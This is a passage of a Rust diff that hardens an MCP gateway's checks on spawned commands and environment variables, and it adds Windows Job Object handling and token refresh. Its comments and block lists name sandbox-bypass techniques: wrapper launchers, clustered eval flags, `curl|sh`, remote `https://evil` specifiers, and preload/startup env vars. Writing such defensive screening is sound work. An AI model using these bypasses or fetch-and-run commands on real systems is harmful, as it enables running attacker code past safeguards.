@@ -643,6 +643,13 @@ const LAUNCHER_WRAPPERS: &[&str] = &[
     "stdbuf", "timeout", "setsid", "ionice", "chrt", "taskset", "setarch", "unbuffer",
     "script", "watch", "flock", "busybox", "proxychains", "proxychains4", "torify",
     "chroot", "capsh", "firejail", "wine",
+    // Namespace / privilege / sandbox launchers and debuggers/tracers that also run their
+    // first bare argument as the real program (`strace node -e <code>`, `nsenter … <cmd>`),
+    // so screening only the wrapper name is the same silent bypass as sudo/time. (`qemu-*`
+    // user-mode emulators do the same and are matched by prefix in screen_spawn_command.)
+    "nsenter", "unshare", "systemd-run", "setpriv", "gosu", "strace", "ltrace", "gdb",
+    "valgrind", "proot", "bwrap", "catchsegv", "eatmydata", "parallel", "rlwrap",
+    "dbus-run-session", "xvfb-run",
 ];
 
 pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String> {
@@ -654,7 +661,7 @@ pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String
     if base == "env" {
         return screen_env_wrapper(args);
     }
-    if LAUNCHER_WRAPPERS.contains(&base.as_str()) {
+    if LAUNCHER_WRAPPERS.contains(&base.as_str()) || base.starts_with("qemu-") {
         return Err(format!(
             "refusing to launch '{command}': wrapper programs like sudo/time/flock run \
              another command from their arguments, which would bypass Toolport's spawn \
@@ -662,15 +669,22 @@ pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String
              real program as the command."
         ));
     }
-    let dangerous: Option<&str> = match base.as_str() {
+    // Dispatch on the interpreter FAMILY so a versioned or renamed binary
+    // (`python3.10`, `python3.10.exe`) screens the same as `python`.
+    let dangerous: Option<&str> = match interpreter_family(&base) {
         // Interpreters: inline-eval and module-preload execute attacker-supplied
-        // code without a script file on disk.
+        // code without a script file on disk. `clustered_eval` additionally catches an
+        // eval flag packed into a getopt cluster (`python -Ec`, `ruby -we`, `sh -ec`).
         "node" | "nodejs" => node_dangerous(args),
         "bun" => bun_dangerous(args),
         "deno" => deno_dangerous(args),
-        "python" | "python2" | "python3" | "pypy" | "pypy3" => first_flag(args, &["-c"]),
-        "ruby" => first_flag(args, &["-e"]),
-        "perl" => first_flag(args, &["-e"]),
+        // py/pyw are the Windows Python launchers; they forward `-c` (and version
+        // selectors like `-3.11`) to the selected interpreter, so screen them as Python.
+        "python" | "python2" | "python3" | "pypy" | "pypy3" | "py" | "pyw" => {
+            first_flag(args, &["-c"]).or_else(|| clustered_eval(args, &['c'], PYTHON_BOOL))
+        }
+        "ruby" => first_flag(args, &["-e"]).or_else(|| clustered_eval(args, &['e'], RUBY_BOOL)),
+        "perl" => first_flag(args, &["-e"]).or_else(|| clustered_eval(args, &['e'], PERL_BOOL)),
         // php: -r/-R run inline code (-R lowercases to -r), -B runs code before input.
         "php" => first_flag(args, &["-r", "-b"]),
         "awk" | "gawk" | "mawk" | "nawk" => awk_dangerous(args),
@@ -679,10 +693,13 @@ pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String
         | "groovy" | "scala" | "clojure" | "bb" | "tclsh" | "wish" => {
             first_flag(args, &["-e", "--eval", "--eval-string"])
         }
-        // Shells: `-c <string>` (or `/c` / `/k` on Windows shells) runs an arbitrary line.
-        "sh" | "bash" | "zsh" | "dash" | "ash" | "fish" | "ksh" | "cmd" => {
+        // Shells: `-c <string>` runs an arbitrary line, incl. clustered `sh -ec <string>`.
+        "sh" | "bash" | "zsh" | "dash" | "ash" | "fish" | "ksh" => {
             first_flag(args, &["-c", "-command", "/c", "/k", "/command"])
+                .or_else(|| clustered_eval(args, &['c'], SHELL_BOOL))
         }
+        // Windows cmd uses `/c` `/k` switches (not getopt clustering), so no cluster check.
+        "cmd" => first_flag(args, &["-c", "-command", "/c", "/k", "/command"]),
         // PowerShell also runs code via `-EncodedCommand` (base64) and any unambiguous
         // abbreviation of `-Command`, none of which an exact-match list catches.
         "pwsh" | "powershell" => pwsh_dangerous(args),
@@ -720,35 +737,66 @@ fn node_dangerous(args: &[String]) -> Option<&str> {
                 || (al.starts_with("-r") && al.len() > 2 && !al.starts_with("--"))
         })
         .map(|a| a.as_str())
+        // getopt clustering packs `-p` (print) and `-e` (eval): `node -pe '<code>'`.
+        .or_else(|| clustered_eval(args, &['e', 'p'], &['i', 'v', 'h']))
 }
 
-/// A remote code specifier deno/bun will fetch and execute: an http(s) URL or an
-/// `npm:` / `jsr:` registry ref. `deno run npm:evil` runs untrusted network code the
-/// same as `deno run https://evil`, so both are screened.
+/// A remote code specifier deno/bun will fetch and execute: an http(s) URL, an
+/// `npm:` / `jsr:` registry ref, or a `data:` inline-source URL. `deno run npm:evil`
+/// and `deno run 'data:text/javascript,<code>'` run untrusted code the same as
+/// `deno run https://evil`, so all are screened.
 fn remote_specifier(arg: &str) -> bool {
     let a = arg.to_ascii_lowercase();
     a.starts_with("http://")
         || a.starts_with("https://")
         || a.starts_with("npm:")
         || a.starts_with("jsr:")
+        || a.starts_with("data:")
 }
 
-/// Deno's lethal invocations are SUBCOMMANDS, not flags: `eval <code>` runs inline
-/// code, and `run`/`serve <remote>` executes code fetched from the network or a
-/// registry. (A `deno run` of a LOCAL script is the normal case and stays allowed.)
-fn deno_dangerous(args: &[String]) -> Option<&str> {
-    if let Some(sub) = args.iter().find(|a| !a.starts_with('-')) {
-        let s = sub.to_ascii_lowercase();
-        if s == "eval" {
-            return Some(sub.as_str());
+/// Walk deno/bun-style args to the operand at or after `from`, skipping option tokens and
+/// the value of a known space-separated value option (`--config x`) so the subcommand and
+/// its executable target aren't mistaken for an option's value. Returns the operand and its
+/// index.
+fn next_operand<'a>(args: &'a [String], from: usize, value_opts: &[&str]) -> (Option<&'a str>, usize) {
+    let mut j = from;
+    while let Some(a) = args.get(j) {
+        if a.starts_with('-') {
+            if value_opts.contains(&a.as_str()) {
+                j += 1; // this option consumes the next token as its value
+            }
+            j += 1;
+        } else {
+            return (Some(a.as_str()), j);
         }
-        if s == "run" || s == "serve" {
-            if let Some(r) = args.iter().find(|a| remote_specifier(a)) {
-                return Some(r.as_str());
+    }
+    (None, j)
+}
+
+/// Deno's lethal invocations are SUBCOMMANDS, not flags: `eval <code>` runs inline code,
+/// and `run`/`serve <remote>` executes code fetched from the network or a registry. A
+/// `deno run` of a LOCAL script is the normal case and stays allowed. Global value options
+/// are skipped so `deno --config x eval …` / `deno --config x run npm:…` can't hide the
+/// subcommand, and only the executable TARGET is remote-checked — a URL passed as an
+/// application argument (`deno run ./s.ts --url https://api`) is not fetched code.
+fn deno_dangerous(args: &[String]) -> Option<&str> {
+    const VALUE_OPTS: &[&str] = &[
+        "--config", "-c", "--import-map", "--lock", "--cert", "--v8-flags", "--seed",
+        "--log-level", "-L",
+    ];
+    let (sub, si) = next_operand(args, 0, VALUE_OPTS);
+    let Some(sub) = sub else { return None };
+    if sub.eq_ignore_ascii_case("eval") {
+        return Some(sub);
+    }
+    if sub.eq_ignore_ascii_case("run") || sub.eq_ignore_ascii_case("serve") {
+        if let (Some(target), _) = next_operand(args, si + 1, VALUE_OPTS) {
+            if remote_specifier(target) {
+                return Some(target);
             }
         }
     }
-    first_flag(args, &["-e", "--eval", "-p", "--print"])
+    None
 }
 
 /// Bun shares node's eval/preload flags, and additionally executes a remote specifier
@@ -758,11 +806,22 @@ fn bun_dangerous(args: &[String]) -> Option<&str> {
     if let Some(f) = node_dangerous(args) {
         return Some(f);
     }
-    if let Some(sub) = args.iter().find(|a| !a.starts_with('-')) {
-        if sub.eq_ignore_ascii_case("run") {
-            if let Some(r) = args.iter().find(|a| remote_specifier(a)) {
-                return Some(r.as_str());
-            }
+    // Like deno: skip global value options and remote-check only the executable target, so
+    // `bun --cwd x run https://evil` is caught while a URL passed as an app arg is ignored.
+    const VALUE_OPTS: &[&str] = &["--cwd", "--config", "-c"];
+    let (sub, si) = next_operand(args, 0, VALUE_OPTS);
+    let Some(sub) = sub else { return None };
+    let (target, _) = if sub.eq_ignore_ascii_case("run")
+        || sub.eq_ignore_ascii_case("x")
+        || sub.eq_ignore_ascii_case("exec")
+    {
+        next_operand(args, si + 1, VALUE_OPTS)
+    } else {
+        (Some(sub), si) // implicit run: the first operand is the target itself
+    };
+    if let Some(target) = target {
+        if remote_specifier(target) {
+            return Some(target);
         }
     }
     None
@@ -824,6 +883,11 @@ pub fn screen_spawn_env(env: &[(String, String)]) -> Result<(), String> {
     // code before (or instead of) the entry program. These have no benign value.
     const BLOCKED: &[&str] = &[
         "LD_PRELOAD", "LD_AUDIT", "DYLD_INSERT_LIBRARIES", "BASH_ENV", "ENV",
+        // ZDOTDIR relocates zsh's startup dir, so `$ZDOTDIR/.zshenv` runs even for a
+        // non-interactive `zsh script` (the zsh analog of the blocked BASH_ENV). GCONV_PATH
+        // points iconv/gconv at an attacker-supplied conversion module. Neither has a
+        // legitimate use on a server launcher.
+        "ZDOTDIR", "GCONV_PATH",
     ];
     // Option vars that are usually benign (tuning) but can inject code via specific
     // options; only those options are refused (whole-var blocking false-positived on
@@ -923,6 +987,67 @@ fn first_flag<'a>(args: &'a [String], flags: &[&str]) -> Option<&'a str> {
     }).map(|a| a.as_str())
 }
 
+/// Interpreter FAMILY for dispatch: trims a trailing version so `python3.10`, `python3`,
+/// and `python` all screen as `python`. Only a trailing run of ASCII digits and `.` is
+/// trimmed, so non-versioned names are unchanged. Pairs with `command_basename`, which
+/// already strips one extension (`python3.10.exe` -> `python3.10`).
+fn interpreter_family(base: &str) -> &str {
+    let trimmed = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
+    if trimmed.is_empty() {
+        base
+    } else {
+        trimmed
+    }
+}
+
+// Benign single-char short flags (case-sensitive) that take NO value, used by
+// `clustered_eval` to know an eval flag packed AFTER them is a real inline-eval. Value-
+// taking flags are deliberately OMITTED (python -m/-W/-X/-Q, ruby/perl -C/-F/-I/-K, shell
+// -o) so a cluster that hands them the rest of the token isn't read as an eval.
+const SHELL_BOOL: &[char] = &[
+    'a', 'b', 'e', 'f', 'h', 'i', 'k', 'm', 'n', 'p', 'r', 's', 't', 'u', 'v', 'x', 'B',
+    'C', 'E', 'H', 'P', 'T',
+];
+const PYTHON_BOOL: &[char] = &[
+    'B', 'E', 'I', 'O', 'R', 'S', 'b', 'd', 'h', 'i', 'q', 's', 'u', 'v', 'x', '3',
+];
+const RUBY_BOOL: &[char] = &['a', 'c', 'd', 'h', 'l', 'n', 'p', 's', 'v', 'w', 'y'];
+const PERL_BOOL: &[char] = &['U', 'W', 'X', 'T', 'a', 'c', 'h', 'l', 'n', 'p', 's', 'w'];
+
+/// getopt short-flag clustering: `-ec` parses as `-e -c`, so an eval flag can ride behind
+/// benign boolean flags (`sh -ec "curl|sh"`, `python -Ec "…"`, `ruby -we "…"`, `node -pe`)
+/// that a plain `-c`/`-e` check misses. Walk a single-dash cluster: reaching an eval char
+/// after a run of known boolean flags is a match; the first non-boolean (possibly value-
+/// taking) char bails, so a value flag swallowing the rest of the token (`python -mHTTP`,
+/// `bash -o pipefail`) is never mistaken for an eval. Case-sensitive so a value-taking
+/// `-E`/`-W`/`-C` isn't read as a lowercase eval. `-c`/`-e` alone and `--long` forms are
+/// already handled by `first_flag`.
+fn clustered_eval<'a>(args: &'a [String], eval: &[char], boolean: &[char]) -> Option<&'a str> {
+    for a in args {
+        let s = a.as_str();
+        // `--` ends the interpreter's own options; tokens after it are the script and its
+        // arguments, not interpreter flags, so a cluster-shaped app arg past `--` is not a
+        // real eval. (Bare operands without `--` are still scanned, matching first_flag's
+        // long-standing behavior; stopping there safely would need per-interpreter value-
+        // option tables, and a naive stop reintroduces bypasses via `-W x -Ec` / `-o v -ec`.)
+        if s == "--" {
+            break;
+        }
+        if !s.starts_with('-') || s.starts_with("--") || s.len() <= 2 {
+            continue;
+        }
+        for c in s[1..].chars() {
+            if eval.contains(&c) {
+                return Some(s);
+            }
+            if !boolean.contains(&c) {
+                break;
+            }
+        }
+    }
+    None
+}
+
 /// Docker/Podman args that ESCALATE beyond what a normal host process already has:
 /// privileged mode, added capabilities, device passthrough, and host-namespace
 /// sharing. Plain host mounts (`-v` / `--volume` / `--mount`) are intentionally NOT
@@ -956,6 +1081,10 @@ fn container_escape_flag(args: &[String]) -> Option<&str> {
 /// (a blocking `read_line` on an unresponsive child would otherwise hang forever).
 pub struct StdioTransport {
     child: Child,
+    /// Windows Job Object that owns the complete launcher process tree. Closing
+    /// it terminates descendants that outlive an `npx`/`uvx` wrapper.
+    #[cfg(windows)]
+    job: Option<WindowsJob>,
     stdin: Arc<Mutex<ChildStdin>>,
     rx: Receiver<String>,
     /// Tail of the child's stderr, drained on a background thread. A server that
@@ -977,6 +1106,165 @@ pub struct StdioTransport {
     /// Answers server-initiated JSON-RPC (e.g. `roots/list`) by forwarding to the
     /// upstream MCP client. Set by the gateway before the connect handshake.
     server_handler: Option<ServerRequestHandler>,
+}
+
+/// Owns a Windows Job Object configured to terminate every assigned process
+/// when the handle closes. Handles are stored as an integer so this RAII owner
+/// remains `Send`, matching [`Transport`], while still owning exactly one native
+/// handle.
+#[cfg(windows)]
+struct WindowsJob {
+    handle: usize,
+}
+
+#[cfg(windows)]
+impl WindowsJob {
+    /// Creates a Job Object that terminates all assigned processes when closed.
+    fn new() -> Result<Self, String> {
+        use std::mem::{size_of, zeroed};
+        use std::ptr;
+        use windows_sys::Win32::System::JobObjects::{
+            CreateJobObjectW, JobObjectExtendedLimitInformation, SetInformationJobObject,
+            JOBOBJECT_EXTENDED_LIMIT_INFORMATION, JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE,
+        };
+
+        // SAFETY: null security/name pointers request a private, non-inheritable
+        // Job Object. `info` has the exact layout and byte size required by the
+        // selected information class.
+        unsafe {
+            let handle = CreateJobObjectW(ptr::null(), ptr::null());
+            if handle.is_null() {
+                return Err(format!(
+                    "failed to create Windows process Job Object: {}",
+                    std::io::Error::last_os_error()
+                ));
+            }
+
+            let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = zeroed();
+            info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
+            if SetInformationJobObject(
+                handle,
+                JobObjectExtendedLimitInformation,
+                &info as *const _ as *const std::ffi::c_void,
+                size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32,
+            ) == 0
+            {
+                let error = std::io::Error::last_os_error();
+                let _ = windows_sys::Win32::Foundation::CloseHandle(handle);
+                return Err(format!(
+                    "failed to configure Windows process Job Object: {error}"
+                ));
+            }
+
+            Ok(Self {
+                handle: handle as usize,
+            })
+        }
+    }
+
+    /// Assigns a suspended child process to this Job Object.
+    fn assign(&self, child: &Child) -> Result<(), String> {
+        use std::os::windows::io::AsRawHandle;
+        use windows_sys::Win32::System::JobObjects::AssignProcessToJobObject;
+
+        // SAFETY: both handles remain valid for the duration of the call. The
+        // Child owns its process handle and this value owns the Job Object.
+        let assigned = unsafe {
+            AssignProcessToJobObject(
+                self.handle as windows_sys::Win32::Foundation::HANDLE,
+                child.as_raw_handle() as windows_sys::Win32::Foundation::HANDLE,
+            )
+        };
+        if assigned == 0 {
+            return Err(format!(
+                "failed to attach downstream process to Windows Job Object: {}",
+                std::io::Error::last_os_error()
+            ));
+        }
+        Ok(())
+    }
+
+    /// Resumes the primary thread of a child created with `CREATE_SUSPENDED`.
+    fn resume(child: &Child) -> Result<(), String> {
+        use std::mem::size_of;
+        use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
+        use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+            CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32,
+            TH32CS_SNAPTHREAD,
+        };
+        use windows_sys::Win32::System::Threading::{
+            OpenThread, ResumeThread, THREAD_SUSPEND_RESUME,
+        };
+
+        // SAFETY: the snapshot and thread handles are checked before use and
+        // closed on every path. A CREATE_SUSPENDED process has a primary thread
+        // before any of its code can execute.
+        unsafe {
+            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+            if snapshot == INVALID_HANDLE_VALUE {
+                return Err(format!(
+                    "failed to enumerate suspended downstream process threads: {}",
+                    std::io::Error::last_os_error()
+                ));
+            }
+
+            let mut entry = THREADENTRY32 {
+                dwSize: size_of::<THREADENTRY32>() as u32,
+                ..Default::default()
+            };
+            let mut has_entry = Thread32First(snapshot, &mut entry);
+            while has_entry != 0 {
+                if entry.th32OwnerProcessID == child.id() {
+                    let thread = OpenThread(THREAD_SUSPEND_RESUME, 0, entry.th32ThreadID);
+                    if thread.is_null() {
+                        let error = std::io::Error::last_os_error();
+                        let _ = CloseHandle(snapshot);
+                        return Err(format!(
+                            "failed to open suspended downstream process thread: {error}"
+                        ));
+                    }
+
+                    let resume_result = ResumeThread(thread);
+                    let resume_error = (resume_result == u32::MAX)
+                        .then(std::io::Error::last_os_error);
+                    let _ = CloseHandle(thread);
+                    let _ = CloseHandle(snapshot);
+                    if let Some(error) = resume_error {
+                        return Err(format!(
+                            "failed to resume downstream process after Job Object assignment: {error}"
+                        ));
+                    }
+                    return Ok(());
+                }
+                has_entry = Thread32Next(snapshot, &mut entry);
+            }
+
+            let _ = CloseHandle(snapshot);
+        }
+
+        Err("failed to find suspended downstream process thread".to_string())
+    }
+}
+
+#[cfg(windows)]
+impl Drop for WindowsJob {
+    fn drop(&mut self) {
+        use windows_sys::Win32::Foundation::CloseHandle;
+        use windows_sys::Win32::System::JobObjects::TerminateJobObject;
+
+        if self.handle == 0 {
+            return;
+        }
+        let handle = self.handle as windows_sys::Win32::Foundation::HANDLE;
+        // SAFETY: this object exclusively owns `handle`. Explicit termination
+        // makes normal teardown immediate; KILL_ON_JOB_CLOSE is the crash-safe
+        // backstop when Rust destructors cannot run.
+        unsafe {
+            let _ = TerminateJobObject(handle, 1);
+            let _ = CloseHandle(handle);
+        }
+        self.handle = 0;
+    }
 }
 
 /// Tolerate a config that packed the whole invocation into `command` (e.g.
@@ -1040,6 +1328,23 @@ pub fn stdio_connect_timeout(command: &str, args: &[String]) -> Duration {
     }
 }
 
+/// Strip the gateway's own `CONDUIT_*` control-plane environment from a spawned
+/// downstream server. A downstream MCP server is untrusted code, and a compromised
+/// package can read its own process environment; in the file-backend and `--http`
+/// bridge deployments that inherited env carries the vault master key
+/// (`CONDUIT_SECRET_KEY`) or the local tool-bridge token (`CONDUIT_HTTP_TOKEN`).
+/// Neither is meant for a downstream server, so remove the whole inherited
+/// `CONDUIT_*` namespace (covers both, plus any future control var). A var the
+/// server set for itself via its own `env` is exempt and left untouched.
+fn strip_gateway_control_env(cmd: &mut Command, configured: &std::collections::HashSet<&str>) {
+    for (key, _) in std::env::vars_os() {
+        let Some(k) = key.to_str() else { continue };
+        if k.starts_with("CONDUIT_") && !configured.contains(k) {
+            cmd.env_remove(&key);
+        }
+    }
+}
+
 impl StdioTransport {
     /// Spawn a downstream server without watching for its tool-list changes.
     /// Used by one-shot callers (the app's health probe and playground) that
@@ -1093,6 +1398,12 @@ impl StdioTransport {
             .stdin(Stdio::piped())
             .stdout(Stdio::piped())
             .stderr(Stdio::piped());
+        // Never hand the gateway's own control-plane env (vault master key /
+        // HTTP-bridge token) to an untrusted downstream server. Anything the server
+        // configured for itself in `env` is exempt. See strip_gateway_control_env.
+        let configured: std::collections::HashSet<&str> =
+            env.iter().map(|(k, _)| k.as_str()).collect();
+        strip_gateway_control_env(&mut cmd, &configured);
         // Optional per-server working directory (issue #239). Unset (or blank)
         // means inherit the gateway's cwd, the previous behavior. `~` and `${VAR}`
         // are expanded so a config can pin a server to a project dir. If the dir
@@ -1109,11 +1420,20 @@ impl StdioTransport {
         #[cfg(windows)]
         {
             use std::os::windows::process::CommandExt;
-            cmd.creation_flags(0x0800_0000);
+            use windows_sys::Win32::System::Threading::{CREATE_NO_WINDOW, CREATE_SUSPENDED};
+            cmd.creation_flags(CREATE_NO_WINDOW | CREATE_SUSPENDED);
         }
+        #[cfg(windows)]
+        let job = WindowsJob::new()?;
         let mut child = cmd
             .spawn()
             .map_err(|e| format!("failed to spawn '{command}': {e}"))?;
+        #[cfg(windows)]
+        if let Err(error) = job.assign(&child).and_then(|_| WindowsJob::resume(&child)) {
+            let _ = child.kill();
+            let _ = child.wait();
+            return Err(error);
+        }
         let stdin = Arc::new(Mutex::new(child.stdin.take().ok_or("no child stdin")?));
         let stdout = child.stdout.take().ok_or("no child stdout")?;
         let stderr = child.stderr.take().ok_or("no child stderr")?;
@@ -1177,6 +1497,8 @@ impl StdioTransport {
 
         Ok(StdioTransport {
             child,
+            #[cfg(windows)]
+            job: Some(job),
             stdin,
             rx,
             stderr: stderr_buf,
@@ -1359,6 +1681,9 @@ impl Transport for StdioTransport {
 
 impl Drop for StdioTransport {
     fn drop(&mut self) {
+        #[cfg(windows)]
+        drop(self.job.take());
+        #[cfg(not(windows))]
         let _ = self.child.kill();
         let _ = self.child.wait();
     }
@@ -1386,9 +1711,11 @@ fn ids_match(got: Option<&Value>, wanted: Option<&Value>) -> bool {
     }
 }
 
-/// A callback that mints a fresh token on a 401/403 (e.g. an OAuth refresh), so a
-/// long-running session recovers from an expired access token instead of failing.
-pub type RefreshFn = Box<dyn Fn() -> Option<String> + Send + Sync>;
+/// A callback that can proactively mint a fresh token before expiry or force a
+/// refresh after a 401/403. `force = false` returns `Ok(None)` when the current
+/// token is still fresh. A proactive error may fall back to the current token;
+/// a forced error is surfaced as a per-server authentication failure.
+pub type RefreshFn = Box<dyn Fn(bool) -> Result<Option<String>, String> + Send + Sync>;
 
 /// Screen resolved socket addresses against the SSRF policy, fail-closed: returns
 /// `Err` if ANY address is link-local / cloud-metadata, or - when `block_private` -
@@ -1417,15 +1744,19 @@ fn screen_resolved_addrs(
     Ok(())
 }
 
-/// A ureq agent for remote MCP HTTP calls, with the SSRF resolver installed. Because
-/// ureq resolves through this resolver immediately before connecting, screening here
-/// validates the exact address dialed - closing the resolve-then-connect (DNS-rebind)
-/// TOCTOU a separate pre-check has. `block_private` extends the screen to internal
-/// addresses for untrusted-provenance servers.
-fn guarded_agent(block_private: bool) -> ureq::Agent {
+/// A ureq agent with the SSRF resolver installed. Because ureq resolves through this
+/// resolver immediately before connecting, screening here validates the exact address
+/// dialed - closing the resolve-then-connect (DNS-rebind) TOCTOU a separate pre-check
+/// has. `block_private` extends the screen to internal addresses for untrusted inputs.
+/// Redirects stay disabled so a credential-bearing request cannot be replayed to a
+/// different host. Callers choose a timeout appropriate for their operation.
+pub(crate) fn guarded_agent_with_timeout(
+    block_private: bool,
+    timeout: std::time::Duration,
+) -> ureq::Agent {
     use std::net::{SocketAddr, ToSocketAddrs};
     ureq::AgentBuilder::new()
-        .timeout(std::time::Duration::from_secs(30))
+        .timeout(timeout)
         // Never follow redirects. MCP Streamable HTTP doesn't need cross-host
         // redirects, and following one would let a malicious server bounce us to an
         // internal address (SSRF, e.g. cloud metadata) or replay our Authorization
@@ -1437,6 +1768,12 @@ fn guarded_agent(block_private: bool) -> ureq::Agent {
             Ok(addrs)
         })
         .build()
+}
+
+/// The remote MCP transport allows longer-lived calls than short auxiliary HTTP
+/// requests such as semantic embedding lookups.
+fn guarded_agent(block_private: bool) -> ureq::Agent {
+    guarded_agent_with_timeout(block_private, std::time::Duration::from_secs(30))
 }
 
 /// Talks to a remote MCP server over the Streamable HTTP transport: each request
@@ -1451,11 +1788,10 @@ pub struct HttpTransport {
     next_id: i64,
     /// Raw bearer token (without the "Bearer " prefix), if the server needs auth.
     auth: Option<String>,
-    /// Called once on a 401/403 to mint a fresh token (an OAuth refresh). Returns
-    /// the new raw token; the request is then retried with it. `None` = no refresh
-    /// available, so an auth failure surfaces as before. This is what lets a long-
-    /// running gateway recover from a short-lived access token expiring mid-session
-    /// instead of 401ing until the server is manually reconnected.
+    /// Called before each POST to refresh a token nearing expiry, and forced once
+    /// after a 401/403 to recover from an already-expired token. A proactive
+    /// `None` or error keeps the current token; a forced refresh must return a new
+    /// raw token or the authentication failure is surfaced.
     refresh: Option<RefreshFn>,
     server_handler: Option<ServerRequestHandler>,
 }
@@ -1520,24 +1856,69 @@ impl HttpTransport {
         Ok(true)
     }
 
+    /// Try to replace a token nearing expiry. Failure here is non-fatal because
+    /// the current token may remain valid throughout the safety window; a real
+    /// 401/403 will force one refresh attempt below.
+    fn refresh_before_send(&mut self) {
+        if let Some(refresh) = &self.refresh {
+            if let Ok(Some(token)) = refresh(false) {
+                self.auth = Some(token);
+            }
+        }
+    }
+
+    fn force_refresh_after_auth_error(&mut self, code: u16) -> Result<(), TransportError> {
+        let Some(refresh) = self.refresh.as_ref() else {
+            return Err(TransportError::Fatal(format!(
+                "HTTP {code} (needs authentication): no refresh callback configured"
+            )));
+        };
+        match refresh(true) {
+            Ok(Some(token)) => {
+                self.auth = Some(token);
+                Ok(())
+            }
+            Ok(None) => Err(TransportError::Fatal(format!(
+                "HTTP {code} (needs authentication): token refresh returned no token"
+            ))),
+            Err(e) => Err(TransportError::Fatal(format!(
+                "HTTP {code} (needs authentication): token refresh failed: {e}"
+            ))),
+        }
+    }
+
     /// POST JSON-RPC without waiting for a response body (inline replies mid-SSE).
     fn send_post_no_response(&mut self, body: &Value) -> Result<(), TransportError> {
         let payload = body.to_string();
-        let mut req = self
-            .inline_agent
-            .post(&self.url)
-            .set("Content-Type", "application/json")
-            .set("Accept", "application/json, text/event-stream")
-            .set("MCP-Protocol-Version", PROTOCOL_VERSION);
-        if let Some(sid) = &self.session_id {
-            req = req.set("Mcp-Session-Id", sid);
-        }
-        if let Some(token) = &self.auth {
-            req = req.set("Authorization", &bearer_header(token));
-        }
-        let resp = req
-            .send_string(&payload)
-            .map_err(|e| TransportError::Fatal(e.to_string()))?;
+        self.refresh_before_send();
+        let mut refreshed = false;
+        let resp = loop {
+            let mut req = self
+                .inline_agent
+                .post(&self.url)
+                .set("Content-Type", "application/json")
+                .set("Accept", "application/json, text/event-stream")
+                .set("MCP-Protocol-Version", PROTOCOL_VERSION);
+            if let Some(sid) = &self.session_id {
+                req = req.set("Mcp-Session-Id", sid);
+            }
+            if let Some(token) = &self.auth {
+                req = req.set("Authorization", &bearer_header(token));
+            }
+            match req.send_string(&payload) {
+                Ok(resp) => break resp,
+                Err(ureq::Error::Status(code, resp))
+                    if (code == 401 || code == 403)
+                        && !refreshed
+                        && self.refresh.is_some() =>
+                {
+                    let _ = read_capped(resp, 8 * 1024);
+                    refreshed = true;
+                    self.force_refresh_after_auth_error(code)?;
+                }
+                Err(e) => return Err(TransportError::Fatal(e.to_string())),
+            }
+        };
         if let Some(sid) = resp.header("Mcp-Session-Id") {
             self.session_id = Some(sid.to_string());
         }
@@ -1597,6 +1978,11 @@ impl HttpTransport {
     fn post(&mut self, body: &Value, expect_response: bool) -> Result<Option<Value>, TransportError> {
         let payload = body.to_string();
 
+        // Refresh shortly before the known expiry, including before initialize.
+        // The callback keeps the deadline in memory, so this is a cheap no-op on
+        // ordinary calls and only touches vaulted OAuth state when refresh is due.
+        self.refresh_before_send();
+
         // Token refresh is handled internally (it doesn't sleep, so no lock
         // contention). Only 429 and transport-retry signals bubble up as
         // TransportError::Retry so the Router can sleep *outside* the lock.
@@ -1635,17 +2021,8 @@ impl HttpTransport {
                 {
                     let _ = read_capped(r, 8 * 1024);
                     refreshed = true;
-                    match self.refresh.as_ref().and_then(|f| f()) {
-                        Some(tok) => {
-                            self.auth = Some(tok);
-                            continue;
-                        }
-                        None => {
-                            return Err(TransportError::Fatal(format!(
-                                "HTTP {code} (needs authentication): token refresh failed"
-                            )))
-                        }
-                    }
+                    self.force_refresh_after_auth_error(code)?;
+                    continue;
                 }
                 Err(ureq::Error::Status(code, r)) => {
                     let detail: String = read_capped(r, 64 * 1024).chars().take(200).collect();
@@ -1908,6 +2285,89 @@ mod tests {
     };
     use serde_json::json;
 
+    #[cfg(windows)]
+    #[test]
+    fn windows_job_terminates_launcher_grandchild() {
+        use super::StdioTransport;
+        use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
+        use windows_sys::Win32::Foundation::{CloseHandle, WAIT_TIMEOUT};
+        use windows_sys::Win32::System::Threading::{
+            OpenProcess, WaitForSingleObject, PROCESS_SYNCHRONIZE,
+        };
+
+        fn process_is_running(pid: u32) -> bool {
+            // SAFETY: OpenProcess returns an owned handle for this check. It is
+            // always closed before returning.
+            unsafe {
+                let handle = OpenProcess(PROCESS_SYNCHRONIZE, 0, pid);
+                if handle.is_null() {
+                    return false;
+                }
+                let state = WaitForSingleObject(handle, 0);
+                let _ = CloseHandle(handle);
+                state == WAIT_TIMEOUT
+            }
+        }
+
+        let nonce = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap()
+            .as_nanos();
+        let pid_file = std::env::temp_dir().join(format!(
+            "toolport-job-test-{}-{nonce}.pid",
+            std::process::id()
+        ));
+        let script_file = pid_file.with_extension("ps1");
+        let escaped_pid_file = pid_file.to_string_lossy().replace('\'', "''");
+        // The parent launches its descendant immediately. The production spawn
+        // path must assign the suspended parent before allowing this code to run.
+        let script = format!(
+            "$grandchild = Start-Process -FilePath 'powershell.exe' \
+               -ArgumentList @('-NoLogo','-NoProfile','-NonInteractive','-Command','Start-Sleep -Seconds 60') \
+               -WindowStyle Hidden -PassThru; \
+             [System.IO.File]::WriteAllText('{escaped_pid_file}', [string]$grandchild.Id); \
+             Wait-Process -Id $grandchild.Id"
+        );
+        std::fs::write(&script_file, script).expect("write launcher script");
+        let args = vec![
+            "-NoLogo".to_string(),
+            "-NoProfile".to_string(),
+            "-NonInteractive".to_string(),
+            "-ExecutionPolicy".to_string(),
+            "Bypass".to_string(),
+            "-File".to_string(),
+            script_file.to_string_lossy().into_owned(),
+        ];
+        let transport = StdioTransport::spawn("powershell.exe", &args, &[], None)
